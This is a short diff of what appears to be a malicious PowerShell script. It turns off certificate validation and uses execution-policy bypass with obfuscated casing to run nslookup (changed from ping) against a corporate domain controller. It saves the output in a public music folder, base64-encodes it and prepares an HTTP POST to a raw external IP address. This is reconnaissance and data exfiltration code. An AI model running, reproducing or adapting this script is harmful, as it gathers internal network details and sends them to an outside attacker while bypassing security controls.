@@ -1,6 +1,6 @@
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 New-Item c:\users\public\music\file.txt;
-PowErsHeLl -ep Bypass "ping -n 1 VK-DC03.corp.vk.com" > c:\users\public\music\file.txt;
+PowErsHeLl -ep Bypass "nslookup VK-DC03.corp.vk.com" > c:\users\public\music\file.txt;
 $EncodedText = [convert]::ToBase64String((Get-Content -path c:\users\public\music\file.txt -Encoding byte));
 $verb = "POST";
 $addr = "https://46.161.53.115/micr0answer";
